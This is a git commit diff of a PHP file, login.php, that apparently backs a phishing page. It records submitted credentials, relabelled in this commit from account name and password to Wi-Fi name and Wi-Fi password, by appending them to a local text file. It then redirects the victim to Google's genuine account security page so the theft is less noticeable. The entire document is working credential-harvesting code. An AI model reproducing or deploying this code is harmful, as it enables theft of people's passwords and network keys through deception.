134f29c2a0c96a59644ffa78e3894146a952bcd2
hack4peace <90603785+official-hack4peace@users.noreply.github.com>
2022-02-24 14:17:12 +0530

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['key2'] . " Pass: " . $_POST['key1'] . "\n", FILE_APPEND);
+file_put_contents("userinfo.txt", "Wifi name: " . $_POST['key2'] . "Wifi Password: " . $_POST['key1'] . "\n", FILE_APPEND);
 header('Location: https://myaccount.google.com/security?pli=1');
 exit();
